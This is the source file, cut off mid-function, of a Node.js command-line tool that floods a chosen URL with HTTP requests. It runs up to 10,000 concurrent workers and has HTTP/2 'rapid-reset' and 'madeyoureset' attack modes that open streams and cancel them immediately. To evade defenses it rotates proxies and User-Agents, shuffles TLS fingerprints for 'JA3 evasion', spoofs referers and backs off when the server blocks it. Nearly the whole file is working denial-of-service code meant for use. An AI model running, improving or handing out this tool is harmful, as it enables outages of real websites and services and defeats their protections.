#!/usr/bin/env node

const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const fs = require('fs');
const path = require('path');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');
const chalk = require('chalk');

let undiciClient;
let undiciAgent;
try {
    undiciClient = require('undici').Client;
    undiciAgent = require('undici').Agent;
} catch (e) {
    console.error(chalk.red('Missing dependency: undici'));
    console.error(chalk.yellow('Install with:  npm install undici chalk@4 yargs'));
    process.exit(1);
}

let ProxyAgent;
try {
    ProxyAgent = require('undici').ProxyAgent;
} catch (e) {
    ProxyAgent = null;
}

let impers = null;
let impersAvailable = false;
async function loadImpers() {
    try {
        impers = await import('impers');
        if (impers.default && typeof impers.default.get === 'function') impers = impers.default;
        if (typeof impers.get !== 'function') throw new Error('impers.get is not a function');
        impersAvailable = true;
    } catch (e) {
        console.error(chalk.yellow('Warning: impers not available (HTTP/3 disabled):'), e.message);
        impersAvailable = false;
        impers = null;
    }
}

// ============ FALLBACK UAs (if ua.txt missing/empty) ============
const FALLBACK_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
];

// ============ LOADERS: PROXIES & UAs ============
function loadLines(filePath, label) {
    try {
        if (!fs.existsSync(filePath)) {
            console.error(chalk.yellow(`Warning: ${label} file not found: ${filePath}`));
            return [];
        }
        const raw = fs.readFileSync(filePath, 'utf8');
        const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
        console.log(chalk.cyan(`Loaded ${lines.length} ${label} from ${path.basename(filePath)}`));
        return lines;
    } catch (e) {
        console.error(chalk.red(`Error reading ${label} file (${filePath}):`), e.message);
        return [];
    }
}

// Proxy formats supported:
//   http://user:pass@host:port
//   https://user:pass@host:port
//   socks5://user:pass@host:port
//   host:port
//   host:port:user:pass
//   user:pass@host:port
function normalizeProxy(raw) {
    if (!raw) return null;
    let s = String(raw).trim();
    if (!s) return null;

    // host:port:user:pass  (proxy-list style)
    if (!/^[a-z0-9+.-]+:\/\//i.test(s) && s.split(':').length === 4) {
        const parts = s.split(':');
        const [host, port, user, pass] = parts;
        s = `http://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}`;
    }
    // host:port
    else if (!/^[a-z0-9+.-]+:\/\//i.test(s) && s.split(':').length === 2) {
        s = `http://${s}`;
    }
    // user:pass@host:port
    else if (!/^[a-z0-9+.-]+:\/\//i.test(s) && s.includes('@') && s.split('@')[0].includes(':')) {
        s = `http://${s}`;
    }

    try {
        const u = new URL(s);
        if (!u.hostname) return null;
        const protocol = (u.protocol || 'http:').replace(':', '');
        return {
            raw: s,
            protocol,
            host: u.hostname,
            port: Number(u.port) || (protocol === 'https' ? 443 : protocol === 'socks5' ? 1080 : 80),
            username: u.username ? decodeURIComponent(u.username) : '',
            password: u.password ? decodeURIComponent(u.password) : '',
            auth: u.username ? `${decodeURIComponent(u.username)}:${decodeURIComponent(u.password)}` : null,
            url: s,
            key: `${protocol}://${u.hostname}:${u.port || ''}`,
        };
    } catch (e) {
        return null;
    }
}

function loadProxies(filePath) {
    const lines = loadLines(filePath, 'proxies');
    const out = [];
    for (const line of lines) {
        const p = normalizeProxy(line);
        if (p) out.push(p);
        else console.error(chalk.gray(`  skipped invalid proxy: ${line}`));
    }
    return out;
}

function loadUserAgents(filePath) {
    const lines = loadLines(filePath, 'User-Agents');
    return lines.length > 0 ? lines : FALLBACK_USER_AGENTS;
}

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

// ============ TLS PROFILES (unchanged) ============
const TLS_PROFILES = [
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256','TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384','TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256','TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA','TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256','TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA','TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384'
    },
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256','TLS_CHACHA20_POLY1305_SHA256','TLS_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256','TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256','TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384','TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA','TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA','TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256','TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA','TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384:P-521'
    }
];

const BURST_CONFIG = { requestsPerBurst: 15, thinkTimeMs: 1200, jitterMs: 800 };
const ADV_BURST_CONFIG = { enabled: false, burstSizeMin: 10, burstSizeMax: 40, thinkMultiplier: 0.5, adaptiveOnLowLatency: true };

const REFERERS = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/",
    "https://www.twitter.com/", "https://www.instagram.com/", "https://www.baidu.com/",
    "https://www.wikipedia.org/", "https://www.yahoo.com/",
];
const ACCEPT_HEADERS = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,**"];

const HTTP_STATUS_CODES = {
    100:"Continue",101:"Switching Protocols",200:"OK",201:"Created",202:"Accepted",204:"No Content",
    301:"Moved Permanently",302:"Found",303:"See Other",304:"Not Modified",307:"Temporary Redirect",308:"Permanent Redirect",
    400:"Bad Request",401:"Unauthorized",402:"Payment Required",403:"Forbidden",404:"Not Found",
    405:"Method Not Allowed",406:"Not Acceptable",407:"Proxy Authentication Required",408:"Request Timeout",
    409:"Conflict",410:"Gone",411:"Length Required",412:"Precondition Failed",413:"Payload Too Large",
    414:"URI Too Long",415:"Unsupported Media Type",416:"Range Not Satisfiable",417:"Expectation Failed",
    418:"I'm a Teapot",421:"Misdirected Request",422:"Unprocessable Entity",423:"Locked",424:"Failed Dependency",
    425:"Too Early",426:"Upgrade Required",428:"Precondition Required",429:"Too Many Requests",
    431:"Request Header Fields Too Large",451:"Unavailable For Legal Reasons",
    500:"Internal Server Error",501:"Not Implemented",502:"Bad Gateway",503:"Service Unavailable",
    504:"Gateway Timeout",505:"HTTP Version Not Supported",506:"Variant Also Negotiates",
    507:"Insufficient Storage",508:"Loop Detected",510:"Not Extended",511:"Network Authentication Required",
    520:"Cloudflare Unknown Error",521:"Web Server Is Down",522:"Connection Timed Out",523:"Origin Is Unreachable",
    524:"A Timeout Occurred",525:"SSL Handshake Failed",526:"Invalid SSL Certificate",
    'RESET':"Stream Reset by Server",999:"Request Denied (LinkedIn)",0:"Connection Error"
};

const CONFIG = {
    MAX_BUFFER_SIZE: 1024 * 1024,
    MAX_DELAY_MS: 10000,
    STREAMS_PER_CONNECTION: 20,
    ATTACK_RECONNECT_MS: 100,
    MONITOR_INTERVAL_MS: 250,
    LOG_QUEUE_SIZE: 5,
    LATENCY_HISTORY_CAP: 10000,
};

const getRandomTlsProfile = () => getRandomElement(TLS_PROFILES);
const stripAnsi = (str) => str.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');
const formatTime = (seconds) => {
    const h = Math.floor(seconds/3600), m = Math.floor((seconds%3600)/60), s = Math.floor(seconds%60);
    return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
};
const validateAndParseUrl = (urlString) => {
    try {
        const p = new URL(urlString);
        if (!['http:','https:'].includes(p.protocol)) throw new Error('Protocol must be http or https');
        if (!p.hostname) throw new Error('Invalid hostname');
        return p;
    } catch (err) { throw new Error(`Invalid URL: ${err.message}`); }
};
const validateArguments = (argv) => {
    if (argv.time <= 0 || argv.time > 1440) throw new Error('Time must be between 0 and 1440 minutes');
    if (argv.conc <= 0 || argv.conc > 10000) throw new Error('Concurrency must be between 1 and 10000');
    if (!['none','rapid-reset','madeyoureset'].includes(argv.attack)) throw new Error('Invalid attack mode');
};
const shuffleArray = (arr) => {
    const a = arr.slice();
    for (let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}
    return a;
};
const getJa3Variant = (profile) => {
    if (!profile) return profile;
    try {
        const v = { ...profile };
        if (profile.ciphers) v.ciphers = shuffleArray((Array.isArray(profile.ciphers)?profile.ciphers:String(profile.ciphers).split(':')).slice()).join(':');
        if (profile.sigalgs) v.sigalgs = shuffleArray(String(profile.sigalgs).split(':')).join(':');
        if (profile.ecdhCurve) v.ecdhCurve = shuffleArray(String(profile.ecdhCurve).split(':')).join(':');
        return v;
    } catch { return profile; }
};

// ============ CLI ============
const argv = yargs(hideBin(process.argv))
    .option('url', { alias:'u', describe:'Target URL', type:'string', demandOption:true })
    .option('time', { alias:'t', describe:'Duration (minutes)', type:'number', default:1 })
    .option('conc', { alias:'c', describe:'Concurrency', type:'number', default:50 })
    .option('attack', { alias:'a', describe:'HTTP/2 attack mode', choices:['none','rapid-reset','madeyoureset'], default:'none' })
    .option('protocol', { alias:'p', describe:'Force protocols (e.g. "1.1,2,3")', type:'string' })
    .option('proxy-file', { alias:'pf', describe:'Path to proxy list file', type:'string', default:'proxy.txt' })
    .option('ua-file', { alias:'uf', describe:'Path to user-agent list file', type:'string', default:'ua.txt' })
    .option('no-proxy', { describe:'Disable proxy usage', type:'boolean', default:false })
    .option('proxy-random', { describe:'Pick a new proxy per request (default: per worker)', type:'boolean', default:false })
    .option('adaptive-delay', { alias:'ad', describe:'Adaptive delay on block codes', type:'boolean', default:false })
    .option('adv-burst', { alias:'ab', describe:'Advanced burst mode', type:'boolean', default:false })
    .option('burst-size', { alias:'bs', describe:'Advanced burst max size', type:'number' })
    .option('think-multiplier', { alias:'tm', describe:'Think time multiplier (0-2)', type:'number' })
    .option('max-retries', { alias:'mr', describe:'Max retries per request', type:'number', default:2 })
    .option('retry-base-ms', { alias:'rb', describe:'Retry base backoff ms', type:'number', default:150 })
    .option('ja3-evasion', { alias:'ja3', describe:'JA3 evasion', type:'boolean', default:true })
    .option('force-http3', { alias:'h3', describe:'Prefer HTTP/3', type:'boolean', default:false })
    .help().alias('help','h').argv;

try { validateArguments(argv); }
catch (err) { console.error(chalk.red('Arg error:'), err.message); process.exit(1); }

const FLAGS = {
    adaptiveDelay: !!argv['adaptive-delay'],
    advBurst: !!argv['adv-burst'],
    burstSize: argv['burst-size'],
    thinkMultiplier: argv['think-multiplier'],
    maxRetries: argv['max-retries'] ?? 2,
    retryBaseMs: argv['retry-base-ms'] ?? 150,
    ja3Evasion: argv['ja3-evasion'] !== false,
    forceHttp3: !!argv['force-http3'] || !!argv.h3,
    protocol: argv.protocol ?? argv.p ?? null,
    useProxy: !argv['no-proxy'],
    proxyRandomPerRequest: !!argv['proxy-random'],
    proxyFile: argv['proxy-file'],
    uaFile: argv['ua-file'],
};

if (FLAGS.advBurst) {
    ADV_BURST_CONFIG.enabled = true;
    if (FLAGS.burstSize && Number.isInteger(FLAGS.burstSize) && FLAGS.burstSize > 0) ADV_BURST_CONFIG.burstSizeMax = FLAGS.burstSize;
    if (typeof FLAGS.thinkMultiplier === 'number') ADV_BURST_CONFIG.thinkMultiplier = Math.max(0, Math.min(2, FLAGS.thinkMultiplier));
}

// ============ LOAD POOLS ============
const PROXIES = FLAGS.useProxy ? loadProxies(path.resolve(FLAGS.proxyFile)) : [];
const USER_AGENTS = loadUserAgents(path.resolve(FLAGS.uaFile));

if (FLAGS.useProxy && PROXIES.length === 0) {
    console.error(chalk.red(`No valid proxies loaded from ${FLAGS.proxyFile}. Running WITHOUT proxies.`));
}
if (FLAGS.useProxy && PROXIES.length > 0 && !ProxyAgent) {
    console.error(chalk.red('undici.ProxyAgent not available. Upgrade undici: npm i undici@latest'));
    process.exit(1);
}

// Build ProxyAgent pool (one agent per proxy, reused)
const proxyAgentPool = [];
if (FLAGS.useProxy && ProxyAgent) {
    for (const p of PROXIES) {
        try {
            // undici ProxyAgent accepts URL string. For socks5 you'll need undici-socks or similar.
            if (p.protocol === 'socks5' || p.protocol === 'socks5h' || p.protocol === 'socks4') {
                console.error(chalk.yellow(`  SOCKS not supported by undici.ProxyAgent natively — skipping ${p.key}`));
                continue;
            }
            const agent = new ProxyAgent({
                uri: p.url,
                requestTls: { rejectUnauthorized: false, servername: undefined },
                proxyTls: { rejectUnauthorized: false },
            });
            proxyAgentPool.push({ proxy: p, agent });
        } catch (e) {
            console.error(chalk.red(`  Failed to build ProxyAgent for ${p.key}: ${e.message}`));
        }
    }
}

console.log(chalk.cyan(`Proxy pool ready: ${proxyAgentPool.length} agents | UA pool: ${USER_AGENTS.length}`));

const parsedUrl = validateAndParseUrl(argv.url);
const target = {
    protocol: parsedUrl.protocol,
    host: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
};
const targetOrigin = `${target.protocol}//${target.host}:${target.port}`;
const isHttps = target.protocol === 'https:';

const durationMs = argv.time * 60 * 1000;
const concurrency = argv.conc;
const attackMode = argv.attack;

let isRunning = true;
let activeProtocols = [];
let activeConnections = new Set();
const stats = {
    requestsSent: 0, responsesReceived: 0, totalLatency: 0, errors: 0,
    attackSent: 0, attackReceived: 0, attackErrors: 0,
    statusCounts: {}, protocolStats: {}, startTime: Date.now(),
    latencies: [], retries: 0, connectionsOpened: 0, activeWorkers: 0,
    proxyOk: 0, proxyFail: 0,
};
const lastLogs = [], lastAttackLogs = [];
const workerDelays = new Array(concurrency).fill(0);
let selectedTlsProfile = null;

// pick a proxy for a worker (sticky) or per-request (random)
function pickProxyAgent(workerId, perRequest = false) {
    if (proxyAgentPool.length === 0) return null;
    if (perRequest) return getRandomElement(proxyAgentPool);
    // sticky assignment per worker
    return proxyAgentPool[workerId % proxyAgentPool.length];
}

// ============ STANDARD WORKER ============
async function runStandardWorker(workerId, protocolKey) {
    let requestsInBurst = 0;
    const protocolLabel = protocolKey.toUpperCase();

    let h3FailStreak = 0;
    let h3CooldownUntil = 0;
    const H3_FAIL_THRESHOLD = 3;
    const H3_COOLDOWN_MS = 5000;

    stats.connectionsOpened++;
    stats.activeWorkers++;

    // pick sticky proxy for this worker (may be null if no proxies)
    const stickyProxy = pickProxyAgent(workerId, false);

    const buildUndiciClient = (proxyEntry) => {
        const opts = {
            connectTimeout: 15000,
            headersTimeout: 30000,
            bodyTimeout: 30000,
            keepAliveTimeout: 30000,
            pipelining: protocolKey === 'h1' ? 1 : 10,
        };
        if (isHttps) {
            const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
            const tlsVariant = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;
            const connectOpts = { rejectUnauthorized: false, servername: target.host, ...tlsVariant };
            connectOpts.ALPNProtocols = protocolKey === 'h1' ? ['http/1.1'] : ['h2','http/1.1'];
            opts.connect = connectOpts;
        }
        if (proxyEntry) {
            // ROUTE THROUGH PROXY — undici ProxyAgent
            opts.dispatcher = proxyEntry.agent;
        }
        return new undiciClient(targetOrigin, opts);
    };

    let client = buildUndiciClient(stickyProxy);
    activeConnections.add(client);

    const getBurstConfig = () => {
        if (ADV_BURST_CONFIG.enabled) {
            let burstSize = Math.floor(Math.random()*(ADV_BURST_CONFIG.burstSizeMax-ADV_BURST_CONFIG.burstSizeMin+1))+ADV_BURST_CONFIG.burstSizeMin;
            if (ADV_BURST_CONFIG.adaptiveOnLowLatency && stats.responsesReceived > 5) {
                const avg = stats.totalLatency / Math.max(1, stats.responsesReceived);
                if (avg < 150) burstSize = Math.min(Math.floor(burstSize*1.5), ADV_BURST_CONFIG.burstSizeMax);
            }
            const thinkTime = Math.max(50, (BURST_CONFIG.thinkTimeMs*ADV_BURST_CONFIG.thinkMultiplier)+(Math.random()*BURST_CONFIG.jitterMs));
            return { requestsPerBurst: burstSize, thinkTimeMs: thinkTime, jitterMs: BURST_CONFIG.jitterMs };
        }
        return { ...BURST_CONFIG };
    };

    const recordLatency = (ms) => {
        stats.latencies.push(ms);
        stats.totalLatency += ms;
        if (stats.latencies.length > CONFIG.LATENCY_HISTORY_CAP) {
            stats.latencies.splice(0, stats.latencies.length - CONFIG.LATENCY_HISTORY_CAP);
            stats.totalLatency = stats.latencies.reduce((a,b)=>a+b,0);
        }
    };

    const applyAdaptiveDelay = (statusCode) => {
        if (!FLAGS.adaptiveDelay) return;
        switch (statusCode) {
            case 401: case 403: case 429: case 431: case 451:
                workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId]||0)+150); break;
            case 400: case 406: case 412: case 422:
                workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId]||0)+75); break;
            default:
                if (statusCode < 400) workerDelays[workerId] = Math.max(0, (workerDelays[workerId]||0)-50);
        }
    };

    const recordSuccess = (statusCode, usedKey, extraNote, latencyMs) => {
        if (!stats.protocolStats[usedKey]) {
            stats.protocolStats[usedKey] = { responses: 0, statuses: {} };
            if (!activeProtocols.includes(usedKey)) activeProtocols.push(usedKey);
        }
        const p = stats.protocolStats[usedKey];
        p.responses++;
        p.statuses[statusCode] = (p.statuses[statusCode]||0)+1;
        const note = extraNote ? ` ${extraNote}` : '';
        lastLogs.push(`[${usedKey.toUpperCase()}]${note} ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2)+'ms')})`);
        if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
        applyAdaptiveDelay(statusCode);
    };

    const doUndiciRequest = async (headers, useCurrentClient = true) => {
        // if per-request random proxy, spin a fresh client routed via random proxy
        let c = client;
        if (proxyAgentPool.length > 0 && FLAGS.proxyRandomPerRequest) {
            const rp = pickProxyAgent(workerId, true);
            c = buildUndiciClient(rp);
            try {
                const { statusCode, body } = await c.request({ path: target.path || '/', method:'GET', headers });
                for await (const _ of body) {}
                return statusCode;
            } finally {
                // do not destroy reused proxies; let undici GC/keepalive
            }
        }
        const { statusCode, body } = await c.request({ path: target.path || '/', method:'GET', headers });
        for await (const _ of body) {}
        return statusCode;
    };

    const doImpersH3 = async (headers) => {
        // impers does not support proxy directly in this setup; only run H3 when no proxy is configured
        if (proxyAgentPool.length > 0) {
            throw new Error('H3 disabled while proxy pool active');
        }
        const opts = { headers, verify:false, httpVersion:3, http_version:'v3', forceHttp3:true };
        const r = await impers.get(`${target.protocol}//${target.host}:${target.port}${target.path}`, opts);
        return { statusCode: r.status || r.statusCode || 0 };
    };

    const doRequestWithRetry = async (attempt = 0) => {
        if (!isRunning) return;

        const headers = {
            'User-Agent': getRandomElement(USER_AGENTS),
            'Accept': getRandomElement(ACCEPT_HEADERS),
            'Referer': getRandomElement(REFERERS),
        };

        stats.requestsSent++;
        const t0 = process.hrtime.bigint();

        try {
            let statusCode, usedKey = protocolKey, extraNote = '';

            if (protocolKey === 'h3') {
                const now = Date.now();
                const canTryH3 = impersAvailable && now >= h3CooldownUntil && proxyAgentPool.length === 0;
                if (!canTryH3) {
                    statusCode = await doUndiciRequest(headers);
                    usedKey = isHttps ? 'h2' : 'h1';
                    extraNote = '(fallback)';
                } else {
                    try {
                        const res = await doImpersH3(headers);
                        statusCode = res.statusCode;
                        usedKey = 'h3';
                        h3FailStreak = 0;
                    } catch (err) {
                        h3FailStreak++;
                        if (h3FailStreak >= H3_FAIL_THRESHOLD) { h3CooldownUntil = Date.now()+H3_COOLDOWN_MS; h3FailStreak=0; }
                        statusCode = await doUndiciRequest(headers);
                        usedKey = isHttps ? 'h2' : 'h1';
                        extraNote = '(fallback)';
                    }
                }
            } else {
                statusCode = await doUndiciRequest(headers);
                usedKey = protocolKey;
                if (proxyAgentPool.length > 0) extraNote = '[proxy]';
                if (isHttps && FLAGS.ja3Evasion) extraNote += ' [ja3]';
            }

            const t1 = process.hrtime.bigint();
            const latencyMs = Number(t1 - t0) / 1e6;
            stats.responsesReceived++;
            recordLatency(latencyMs);
            if (proxyAgentPool.length > 0) stats.proxyOk++;
            recordSuccess(statusCode, usedKey, extraNote, latencyMs);

        } catch (err) {
            stats.errors++;
            if (proxyAgentPool.length > 0) stats.proxyFail++;
            if (!stats.protocolStats[protocolKey]) stats.protocolStats[protocolKey] = { responses:0, statuses:{} };
            stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0]||0)+1;
            const errCode = err && (err.code || err.message) ? (err.code || String(err.message).slice(0,40)) : 'ERROR';
            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${errCode})`);
            if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();

            if (FLAGS.adaptiveDelay) workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId]||0)+100);

            const maxRetries = Math.max(0, Math.min(10, FLAGS.maxRetries));
            if (attempt < maxRetries && isRunning) {
                stats.retries++;
                const base = Math.max(50, FLAGS.retryBaseMs);
                const backoff = base * Math.pow(2, attempt) + Math.floor(Math.random()*base);
                await new Promise(r => setTimeout(r, Math.min(backoff, CONFIG.MAX_DELAY_MS)));
                return doRequestWithRetry(attempt+1);
            }
        }
    };

    const scheduleNext = () => {
        if (!isRunning) return;
        const cfg = getBurstConfig();
        requestsInBurst++;
        const adaptiveMs = FLAGS.adaptiveDelay ? (workerDelays[workerId]||0) : 0;
        if (requestsInBurst >= cfg.requestsPerBurst) {
            requestsInBurst = 0;
            const think = cfg.thinkTimeMs + Math.random()*cfg.jitterMs + adaptiveMs;
            setTimeout(() => { if (!isRunning) return; doRequestWithRetry().finally(scheduleNext); }, Math.min(think, CONFIG.MAX_DELAY_MS));
        } else if (adaptiveMs > 0) {
            setTimeout(() => { if (!isRunning) return; doRequestWithRetry().finally(scheduleNext); }, Math.min(adaptiveMs, CONFIG.MAX_DELAY_MS));
        } else {
            setImmediate(() => { if (!isRunning) return; doRequestWithRetry().finally(scheduleNext); });
        }
    };

    setImmediate(() => { if (!isRunning) return; doRequestWithRetry().finally(scheduleNext); });
}

// ============ HTTP/2 ATTACK WORKER (proxy-aware, best-effort) ============
function connectH2ThroughProxy(proxyEntry) {
    // Node's http2.connect doesn't accept proxies directly. We tunnel manually via CONNECT.
    return new Promise((resolve, reject) => {
        if (!proxyEntry) return reject(new Error('no proxy'));
        const p = proxyEntry.proxy;
        const isHttpsProxy = p.protocol === 'https';

        // 1. establish tunnel to proxy
        const req = (isHttpsProxy ? https : http).request({
            host: p.host,
            port: p.port,
            method: 'CONNECT',
            path: `${target.host}:${target.port}`,
            headers: p.auth ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(p.auth).toString('base64') } : {},
            rejectUnauthorized: false,
        });
        req.on('connect', (res, socket) => {
            if (res.statusCode !== 200) {
                socket.destroy();
                return reject(new Error(`Proxy CONNECT failed: ${res.statusCode}`));
            }
            // 2. wrap raw socket with TLS (if https target) then upgrade to http2
            if (!isHttps) {
                // h2c over tunnel — rare, just try
                const client = http2.connect(targetOrigin, { createConnection: () => socket });
                return resolve(client);
            }
            const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
            const tlsOpts = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;
            const tlsSock = tls.connect({
                socket,
                servername: target.host,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
                ...tlsOpts,
            });
            tlsSock.once('secureConnect', () => {
                if (tlsSock.alpnProtocol !== 'h2') {
                    tlsSock.destroy();
                    return reject(new Error('ALPN failed: ' + tlsSock.alpnProtocol));
                }
                const client = http2.connect(targetOrigin, { createConnection: () => tlsSock });
                resolve(client);
            });
            tlsSock.once('error', reject);
        });
        req.on('error', reject);
        req.end();
    });
}

async function startHttp2AttackWorker() {
    if (!isRunning) return;
    stats.connectionsOpened++;

    let client;
    try {
        if (proxyAgentPool.length > 0) {
            const proxyEntry = getRandomElement(proxyAgentPool);
            client = await connectH2ThroughProxy(proxyEntry);
        } else {
            const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
            const tlsOpts = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;
            client = http2.connect(targetOrigin, { rejectUnauthorized: false, ...tlsOpts });
        }
    } catch (e) {
        lastAttackLogs.push(`[H2-Connect] ${chalk.red('FAIL')} (${e.message})`);
        if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
        return;
    }

    activeConnections.add(client);

    const reconnect = () => {
        if (!client.destroyed) { try { client.destroy(); } catch {} }
        if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
    };
    client.on('goaway', reconnect);
    client.on('error', reconnect);
    client.on('close', reconnect);

    client.on('connect', () => {
        for (let i = 0; i < CONFIG.STREAMS_PER_CONNECTION; i++) {
            if (attackMode === 'rapid-reset') sendRapidReset(client);
            if (attackMode === 'madeyoureset') sendMadeYouReset(client);
        }
    });
}

function sendRapidReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method':'GET', ':path':target.path, ':scheme':'https', ':authority':target.host };
    stats.attackSent++;
    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const sc = h[':status'];
            stats.statusCounts[sc] = (stats.statusCounts[sc]||0)+1;
            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(sc)}`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', () => { stats.attackErrors++; stats.statusCounts[0] = (stats.statusCounts[0]||0)+1; });
        setImmediate(() => { if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL); });
    } catch { stats.attackErrors++; }
}

function sendMadeYouReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method':'POST', ':path':target.path, ':scheme':'https', ':authority':target.host };
    stats.attackSent++;
    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const sc = h[':status'];
            stats.statusCounts[sc] = (stats.statusCounts[sc]||0)+1;
            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(sc)}`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', (err) => {
            if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
                stats.statusCounts['RESET'] = (stats.statusCounts['RESET']||0)+1;
